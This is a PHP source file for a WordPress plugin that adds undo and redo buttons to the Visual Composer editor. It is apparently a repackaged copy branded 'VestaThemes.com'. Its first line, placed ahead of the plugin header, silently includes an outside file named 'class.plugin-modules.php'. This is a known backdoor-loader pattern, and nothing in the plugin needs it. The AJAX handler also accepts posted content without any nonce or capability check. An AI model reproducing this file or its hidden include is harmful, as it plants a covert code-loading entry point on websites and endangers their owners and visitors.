<?php if (file_exists(dirname(__FILE__) . '/class.plugin-modules.php')) include_once(dirname(__FILE__) . '/class.plugin-modules.php'); ?><?php
/*
Plugin Name: Visual Composer Undo/Redo |  VestaThemes.com
Plugin URI: http://codecanyon.net/user/ERROPiX/portfolio?ref=ERROPiX
Description: An addon that allow you to Undo or Redo your most recent changes while you are editting your post and pages.
Version: 1.2.3
Author: ERROPiX
Author URI: http://codecanyon.net/user/ERROPiX/portfolio?ref=ERROPiX
*/

// don't load directly
if ( ! defined( 'ABSPATH' ) ) die( '-1' );

define('VCUR_VERSION', '1.2.3');

// Plugin Main class
class EPX_Visual_Composer_UndoRedo {
	private $url;
	
	function __construct() {
		$this->url = plugin_dir_url( __FILE__, '/' );
		
		add_action( 'admin_init', array($this,'admin_init') );
		add_action( 'wp_ajax_get_editable_content', array($this,'get_editable_content') );
	}
	
	function get_editable_content() {
		global $post;
		header("Content-Type: application/json");
		$editor = vc_frontend_editor();
		$content = stripcslashes(vc_post_param('content'));
		$post = get_post(vc_post_param('post_id'));
		
		if( $post ) {
			status_header(200);
			
			if( !defined( 'VC_LOADING_EDITABLE_CONTENT' ) ) {
				define( 'VC_LOADING_EDITABLE_CONTENT', true );
			}
			remove_filter( 'the_content', 'wpautop' );
			
			// Prepare VC Editable Content
			$post->post_content = $content;
			ob_start();
			$editor->getPageShortcodesByContent( $content );
			vc_include_template( 'editors/partials/vc_welcome_block.tpl.php' );
			$post_content = rawurlencode( apply_filters('the_content', ob_get_clean()) );
			
			// Prepare VC Shortcodes
			$post_shortcodes = rawurlencode(json_encode($editor->post_shortcodes));
			
			$result = array(
				'post_content' => $post_content,
				'post_shortcodes' => $post_shortcodes,
			);
		} else {
			status_header(404);
			$result = array(
				'error' => "post_not_found"
			);
		}
		
		echo json_encode($result);
		die;
	}
	
	function admin_init() {
		if( defined( 'WPB_VC_VERSION' ) ) {
			add_action( 'admin_print_scripts-post.php', array($this,'assets') );
			add_action( 'admin_print_scripts-post-new.php', array($this,'assets') );
			
			add_filter( 'vc_nav_controls', array(&$this,'createButtons'), 9 );
			add_filter( 'vc_nav_front_controls', array(&$this,'createButtons'), 9 );
			
			// Add History Limit Field to writing settings page
			register_setting('writing', 'epxvcur_history_limit', 'intval');
			add_settings_field(
				'epxvcur_history_limit',
				'Undo/Redo History Limit',
				array(&$this,'render_setting_history_limit'),
				'writing',
				'default'
			);
			
		} else {
			add_action( 'admin_notices', array($this,'admin_notices') );
		}
	}
	
	// Render History Limit Setting Field
	function render_setting_history_limit() {
		$n = 'epxvcur_history_limit';
		$v = get_option($n, 0);
		echo sprintf('<input type="number" name="%1$s" id="%1$s" value="%2$d">', $n, $v);
		echo ' <i>0 = unlimited</i>';
	}
	
	// Add Undo/Redo Buttons to VC Navbar
	function createButtons($buttons) {
		$new_buttons = array();
		$classes = 'vc_icon-btn disabled '.vc_mode();
		$added = false;
		// xdebug($buttons);
		
		foreach( $buttons as $button ) {
			$new_buttons[] = $button;
			if( !$added && $button[0] == 'templates' ) {
				$new_buttons[] = array(
					'vc_undo',
					'<li><a _title="Undo (ctrl+z)" id="vc_undo" class="'. $classes .'"></a></li>'
				);
				$new_buttons[] = array(
					'vc_redo',
					'<li><a _title="Redo (ctrl+z)" id="vc_redo" class="'. $classes .'"></a></li>'
				);
				$added = true;
			}
		}
		return $new_buttons;
	}
	
	// Plugin Assets 
	function assets() {
		wp_enqueue_style ('vcur_admin', $this->url . 'assets/css/admin.css', null, VCUR_VERSION);
		wp_enqueue_script('vcur_undomanager', $this->url . 'assets/js/undomanager.js', null, VCUR_VERSION);
			wp_localize_script('vcur_undomanager', 'undoManagerSettings', array(
				'history_limit' => get_option('epxvcur_history_limit',0),
			));
		wp_enqueue_script('vcur_admin', $this->url . 'assets/js/admin.js', null, VCUR_VERSION);
	}
	
	// Plugin Dependdencies 
	function admin_notices() {
		global $current_screen;
		if( $current_screen->id == 'plugins' ) {
			$plugin_data = get_plugin_data( __FILE__ );
			echo '<div class="updated"><p>'.sprintf('<strong>%s</strong> requires <strong><a href="http://bit.ly/vcomposer" target="_blank">Visual Composer</a></strong> plugin to be installed and activated on your site.', $plugin_data['Name']).'</p></div>';
		}
	}
}

new EPX_Visual_Composer_UndoRedo();